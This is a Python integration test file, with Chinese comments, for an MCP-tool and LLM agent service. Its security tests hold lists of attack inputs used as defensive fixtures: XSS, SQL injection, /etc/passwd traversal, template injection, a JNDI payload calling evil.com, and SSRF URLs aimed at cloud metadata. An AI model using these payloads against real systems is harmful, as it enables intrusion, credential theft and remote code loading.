"""
完整集成测试
Full Integration Tests

测试整个系统的端到端功能
"""

import pytest
import asyncio
import os
import time
from unittest.mock import Mock, AsyncMock, patch
from pathlib import Path

from tests.fixtures.test_data import (
    TEST_ENV_VARS, MOCK_MCP_TOOLS, MOCK_TOOL_RESPONSE,
    mock_env_vars, mock_config, mock_mcp_manager
)


class TestSystemIntegration:
    """系统集成测试"""
    
    @pytest.mark.asyncio
    async def test_configuration_to_mcp_integration(self, mock_env_vars):
        """测试配置系统到MCP工具的集成"""
        with patch('agent.configuration.MCPConfiguration') as mock_config_class, \
             patch('agent.mcp_tools.MCPToolManager') as mock_manager_class:
            
            # 模拟配置
            mock_config = Mock()
            mock_config.mcp_server_url = TEST_ENV_VARS["MCP_SERVER_URL"]
            mock_config_class.from_runnable_config.return_value = mock_config
            
            # 模拟MCP管理器
            mock_manager = AsyncMock()
            mock_manager.initialize.return_value = True
            mock_manager.get_tools_count.return_value = len(MOCK_MCP_TOOLS)
            mock_manager_class.return_value = mock_manager
            
            # 测试集成流程
            from agent.configuration import MCPConfiguration
            from agent.mcp_tools import MCPToolManager
            
            # 1. 创建配置
            config = MCPConfiguration.from_runnable_config()
            
            # 2. 使用配置创建MCP管理器
            manager = MCPToolManager(config.mcp_server_url)
            
            # 3. 初始化MCP管理器
            success = await manager.initialize()
            
            assert success is True
            assert manager.get_tools_count() == len(MOCK_MCP_TOOLS)
    
    @pytest.mark.asyncio
    async def test_mcp_to_llm_integration(self, mock_env_vars):
        """测试MCP工具到LLM的集成"""
        with patch('agent.configuration.MCPConfiguration') as mock_config_class, \
             patch('agent.mcp_tools.MCPToolManager') as mock_manager_class, \
             patch('langchain_openai.ChatOpenAI') as mock_llm_class:
            
            # 模拟配置
            mock_config = Mock()
            mock_config.model_name = TEST_ENV_VARS["MODEL_NAME"]
            mock_config.model_url = TEST_ENV_VARS["MODEL_BASE_URL"]
            mock_config.model_api_key = TEST_ENV_VARS["MODEL_API_KEY"]
            mock_config.mcp_server_url = TEST_ENV_VARS["MCP_SERVER_URL"]
            mock_config.temperature = 0.1
            mock_config_class.from_runnable_config.return_value = mock_config
            
            # 模拟MCP管理器
            mock_manager = AsyncMock()
            mock_manager.initialize.return_value = True
            mock_manager.call_tool.return_value = (True, {"result": "tool_data"}, "Success")
            mock_manager_class.return_value = mock_manager
            
            # 模拟LLM
            mock_llm = AsyncMock()
            mock_response = Mock()
            mock_response.content = "Based on the tool result: tool_data, here's my analysis..."
            mock_llm.ainvoke.return_value = mock_response
            mock_llm_class.return_value = mock_llm
            
            # 测试集成流程
            from agent.configuration import MCPConfiguration
            from agent.mcp_tools import MCPToolManager
            from langchain_openai import ChatOpenAI
            
            # 1. 创建配置
            config = MCPConfiguration.from_runnable_config()
            
            # 2. 创建MCP管理器和LLM
            manager = MCPToolManager(config.mcp_server_url)
            llm = ChatOpenAI(
                model=config.model_name,
                base_url=config.model_url,
                api_key=config.model_api_key,
                temperature=config.temperature
            )
            
            # 3. 初始化MCP管理器
            await manager.initialize()
            
            # 4. 调用工具获取数据
            success, tool_data, message = await manager.call_tool("test_tool", {})
            
            # 5. 使用LLM处理工具数据
            if success:
                from langchain_core.messages import HumanMessage
                human_message = HumanMessage(content=f"Analyze this data: {tool_data}")
                llm_response = await llm.ainvoke([human_message])
                
                assert "tool_data" in llm_response.content
                assert len(llm_response.content) > 0
    
    @pytest.mark.asyncio
    async def test_fastapi_to_backend_integration(self, mock_env_vars):
        """测试FastAPI到后端系统的集成"""
        from fastapi.testclient import TestClient
        
        with patch('agent.configuration.MCPConfiguration') as mock_config_class:
            # 模拟配置
            mock_config_class.get_available_models.return_value = {
                "test_model": {
                    "name": "Test Model",
                    "description": "Test model for integration",
                    "base_url": "http://test.example.com/v1"
                }
            }
            
            from agent.app import app
            client = TestClient(app)
            
            # 测试健康检查
            health_response = client.get("/api/v1/health")
            assert health_response.status_code == 200
            assert health_response.json()["status"] == "healthy"
            
            # 测试模型端点
            models_response = client.get("/api/v1/models")
            assert models_response.status_code == 200
            
            models_data = models_response.json()
            assert models_data["success"] is True
            assert len(models_data["models"]) > 0
    
    @pytest.mark.asyncio
    async def test_end_to_end_query_flow(self, mock_env_vars):
        """测试端到端查询流程"""
        with patch('agent.configuration.MCPConfiguration') as mock_config_class, \
             patch('agent.mcp_tools.MCPToolManager') as mock_manager_class, \
             patch('langchain_openai.ChatOpenAI') as mock_llm_class:
            
            # 模拟所有组件
            mock_config = Mock()
            mock_config.model_name = "test-model"
            mock_config.model_url = "http://test.example.com/v1"
            mock_config.model_api_key = "test-key"
            mock_config.mcp_server_url = "http://test-mcp.example.com"
            mock_config.temperature = 0.1
            mock_config_class.from_runnable_config.return_value = mock_config
            
            mock_manager = AsyncMock()
            mock_manager.initialize.return_value = True
            mock_manager.get_tools_count.return_value = 3
            mock_manager.call_tool.return_value = (True, {"stock_info": "AAPL data"}, "Success")
            mock_manager_class.return_value = mock_manager
            
            mock_llm = AsyncMock()
            mock_llm_response = Mock()
            mock_llm_response.content = "Based on the stock data, AAPL is performing well."
            mock_llm.ainvoke.return_value = mock_llm_response
            mock_llm_class.return_value = mock_llm
            
            # 模拟完整查询流程
            from agent.configuration import MCPConfiguration
            from agent.mcp_tools import MCPToolManager
            from langchain_core.messages import HumanMessage
            
            # 1. 创建配置
            config = MCPConfiguration.from_runnable_config()
            
            # 2. 创建MCP管理器
            manager = MCPToolManager(config.mcp_server_url)
            await manager.initialize()
            
            # 3. 执行工具调用
            success, data, message = await manager.call_tool("stock_query", {"symbol": "AAPL"})
            
            # 验证结果
            assert success is True
            assert "AAPL" in str(data)


class TestPerformanceIntegration:
    """性能集成测试"""
    
    @pytest.mark.asyncio
    async def test_concurrent_requests_performance(self, mock_env_vars):
        """测试并发请求性能"""
        with patch('agent.configuration.MCPConfiguration') as mock_config_class, \
             patch('agent.mcp_tools.MCPToolManager') as mock_manager_class:
            
            # 模拟配置和管理器
            mock_config = Mock()
            mock_config.mcp_server_url = "http://test-mcp.example.com"
            mock_config_class.from_runnable_config.return_value = mock_config
            
            mock_manager = AsyncMock()
            mock_manager.initialize.return_value = True
            mock_manager.call_tool.return_value = (True, {"data": "test"}, "Success")
            mock_manager_class.return_value = mock_manager
            
            from agent.mcp_tools import MCPToolManager
            
            # 创建多个管理器实例
            managers = []
            for i in range(5):
                manager = MCPToolManager(mock_config.mcp_server_url)
                await manager.initialize()
                managers.append(manager)
            
            # 并发执行工具调用
            start_time = time.time()
            
            tasks = []
            for manager in managers:
                task = manager.call_tool("test_tool", {"param": "value"})
                tasks.append(task)
            
            results = await asyncio.gather(*tasks)
            
            end_time = time.time()
            total_time = end_time - start_time
            
            # 验证性能
            assert total_time < 5.0  # 应该在5秒内完成
            assert len(results) == 5
            assert all(result[0] for result in results)  # 所有调用都成功
    
    @pytest.mark.asyncio
    async def test_memory_usage_integration(self, mock_env_vars):
        """测试内存使用集成"""
        import psutil
        import gc
        
        process = psutil.Process()
        initial_memory = process.memory_info().rss / 1024 / 1024  # MB
        
        with patch('agent.configuration.MCPConfiguration') as mock_config_class, \
             patch('agent.mcp_tools.MCPToolManager') as mock_manager_class:
            
            mock_config = Mock()
            mock_config.mcp_server_url = "http://test-mcp.example.com"
            mock_config_class.from_runnable_config.return_value = mock_config
            
            mock_manager = AsyncMock()
            mock_manager.initialize.return_value = True
            mock_manager_class.return_value = mock_manager
            
            # 创建大量对象
            managers = []
            for i in range(100):
                from agent.mcp_tools import MCPToolManager
                manager = MCPToolManager(mock_config.mcp_server_url)
                await manager.initialize()
                managers.append(manager)
            
            peak_memory = process.memory_info().rss / 1024 / 1024  # MB
            
            # 清理
            del managers
            gc.collect()
            
            final_memory = process.memory_info().rss / 1024 / 1024  # MB
            
            # 验证内存使用
            memory_increase = peak_memory - initial_memory
            memory_cleanup = peak_memory - final_memory
            
            assert memory_increase < 500  # 不应该增加超过500MB
            assert memory_cleanup > 0  # 应该有一些内存被清理
    
    @pytest.mark.asyncio
    async def test_error_recovery_integration(self, mock_env_vars):
        """测试错误恢复集成"""
        with patch('agent.configuration.MCPConfiguration') as mock_config_class, \
             patch('agent.mcp_tools.MCPToolManager') as mock_manager_class:
            
            mock_config = Mock()
            mock_config.mcp_server_url = "http://test-mcp.example.com"
            mock_config_class.from_runnable_config.return_value = mock_config
            
            # 模拟间歇性错误
            call_count = 0
            async def mock_call_tool(tool_name, params):
                nonlocal call_count
                call_count += 1
                if call_count <= 2:
                    raise Exception("Network error")
                return (True, {"data": "success"}, "Success")
            
            mock_manager = AsyncMock()
            mock_manager.initialize.return_value = True
            mock_manager.call_tool = mock_call_tool
            mock_manager_class.return_value = mock_manager
            
            from agent.mcp_tools import MCPToolManager
            
            manager = MCPToolManager(mock_config.mcp_server_url)
            await manager.initialize()
            
            # 测试错误恢复
            results = []
            for i in range(5):
                try:
                    result = await manager.call_tool("test_tool", {})
                    results.append(result)
                except Exception as e:
                    results.append((False, None, str(e)))
            
            # 验证错误恢复
            successful_calls = sum(1 for result in results if result[0])
            failed_calls = len(results) - successful_calls
            
            assert failed_calls == 2  # 前两次调用失败
            assert successful_calls == 3  # 后三次调用成功


class TestSecurityIntegration:
    """安全集成测试"""
    
    def test_environment_variable_security(self, mock_env_vars):
        """测试环境变量安全性"""
        from agent.configuration import MCPConfiguration
        
        with patch('agent.configuration.MCPConfiguration.from_runnable_config') as mock_from_config:
            mock_config = Mock()
            mock_config.model_api_key = "sk-test123456"
            mock_config.mcp_server_url = "http://test-mcp.example.com"
            mock_from_config.return_value = mock_config
            
            config = MCPConfiguration.from_runnable_config()
            
            # 验证敏感信息不会在日志中暴露
            config_repr = repr(config)
            config_str = str(config)
            
            # API密钥不应该完整显示
            if hasattr(config, 'model_api_key'):
                assert "sk-test123456" not in config_repr or "***" in config_repr
                assert "sk-test123456" not in config_str or "***" in config_str
    
    @pytest.mark.asyncio
    async def test_input_validation_integration(self, mock_env_vars):
        """测试输入验证集成"""
        with patch('agent.mcp_tools.MCPToolManager') as mock_manager_class:
            mock_manager = AsyncMock()
            mock_manager.initialize.return_value = True
            mock_manager_class.return_value = mock_manager
            
            from agent.mcp_tools import MCPToolManager
            
            # 测试恶意输入
            malicious_inputs = [
                {"param": "<script>alert('xss')</script>"},
                {"param": "'; DROP TABLE users; --"},
                {"param": "../../../etc/passwd"},
                {"param": "{{7*7}}"},  # 模板注入
                {"param": "${jndi:ldap://evil.com/}"}  # JNDI注入
            ]
            
            manager = MCPToolManager("http://test-mcp.example.com")
            await manager.initialize()
            
            for malicious_input in malicious_inputs:
                # 调用应该被安全处理，不应该抛出异常
                try:
                    result = await manager.call_tool("test_tool", malicious_input)
                    # 验证输入被适当处理
                    assert isinstance(result, tuple)
                    assert len(result) == 3
                except Exception as e:
                    # 如果抛出异常，应该是预期的验证错误
                    assert "validation" in str(e).lower() or "invalid" in str(e).lower()
    
    def test_url_validation_integration(self):
        """测试URL验证集成"""
        from agent.mcp_tools import MCPToolManager
        
        # 测试恶意URL
        malicious_urls = [
            "javascript:alert('xss')",
            "data:text/html,<script>alert('xss')</script>",
            "file:///etc/passwd",
            "ftp://evil.com/malware",
            "http://localhost:22/ssh",  # 端口扫描
            "http://169.254.169.254/metadata"  # AWS元数据
        ]
        
        for url in malicious_urls:
            try:
                manager = MCPToolManager(url)
                # 如果没有抛出异常，URL应该被标准化或验证
                assert manager.server_url == url or manager.server_url.startswith("http")
            except (ValueError, TypeError) as e:
                # 预期的行为：恶意URL被拒绝
                assert "invalid" in str(e).lower() or "malformed" in str(e).lower()


class TestReliabilityIntegration:
    """可靠性集成测试"""
    
    @pytest.mark.asyncio
    async def test_timeout_handling_integration(self, mock_env_vars):
        """测试超时处理集成"""
        with patch('agent.mcp_tools.MCPToolManager') as mock_manager_class:
            # 模拟超时
            async def slow_initialize():
                await asyncio.sleep(10)  # 10秒延迟
                return True
            
            mock_manager = AsyncMock()
            mock_manager.initialize = slow_initialize
            mock_manager_class.return_value = mock_manager
            
            from agent.mcp_tools import MCPToolManager
            
            manager = MCPToolManager("http://test-mcp.example.com", timeout=1.0)
            
            start_time = time.time()
            
            try:
                result = await asyncio.wait_for(manager.initialize(), timeout=2.0)
                # 如果没有超时，验证结果
                assert isinstance(result, bool)
            except asyncio.TimeoutError:
                # 超时是预期的行为
                pass
            
            end_time = time.time()
            elapsed = end_time - start_time
            
            # 验证超时处理
            assert elapsed < 3.0  # 应该在3秒内超时
    
    @pytest.mark.asyncio
    async def test_connection_retry_integration(self, mock_env_vars):
        """测试连接重试集成"""
        with patch('agent.mcp_tools.MCPToolManager') as mock_manager_class:
            retry_count = 0
            
            async def failing_initialize():
                nonlocal retry_count
                retry_count += 1
                if retry_count < 3:
                    raise ConnectionError("Connection failed")
                return True
            
            mock_manager = AsyncMock()
            mock_manager.initialize = failing_initialize
            mock_manager_class.return_value = mock_manager
            
            from agent.mcp_tools import MCPToolManager
            
            manager = MCPToolManager("http://test-mcp.example.com")
            
            # 测试重试逻辑（需要在实际实现中添加重试机制）
            max_retries = 3
            for attempt in range(max_retries):
                try:
                    result = await manager.initialize()
                    if result:
                        break
                except ConnectionError:
                    if attempt == max_retries - 1:
                        raise
                    await asyncio.sleep(0.1)  # 短暂延迟后重试
            
            # 验证重试成功
            assert retry_count == 3
    
    @pytest.mark.asyncio
    async def test_resource_cleanup_integration(self, mock_env_vars):
        """测试资源清理集成"""
        with patch('agent.mcp_tools.MCPToolManager') as mock_manager_class:
            cleanup_called = False
            
            class MockManager:
                def __init__(self, url):
                    self.server_url = url
                    self.initialized = False
                    self.client = None
                
                async def initialize(self):
                    self.initialized = True
                    self.client = Mock()
                    return True
                
                async def cleanup(self):
                    nonlocal cleanup_called
                    cleanup_called = True
                    self.initialized = False
                    self.client = None
                
                async def __aenter__(self):
                    await self.initialize()
                    return self
                
                async def __aexit__(self, exc_type, exc_val, exc_tb):
                    await self.cleanup()
            
            mock_manager_class.return_value = MockManager("http://test-mcp.example.com")
            
            from agent.mcp_tools import MCPToolManager
            
            # 测试上下文管理器（如果实现了的话）
            manager_instance = MCPToolManager("http://test-mcp.example.com")
            
            if hasattr(manager_instance, '__aenter__'):
                async with manager_instance as manager:
                    assert manager.initialized is True
                
                assert cleanup_called is True
            else:
                # 手动测试清理
                await manager_instance.initialize()
                if hasattr(manager_instance, 'cleanup'):
                    await manager_instance.cleanup()
                    assert cleanup_called is True 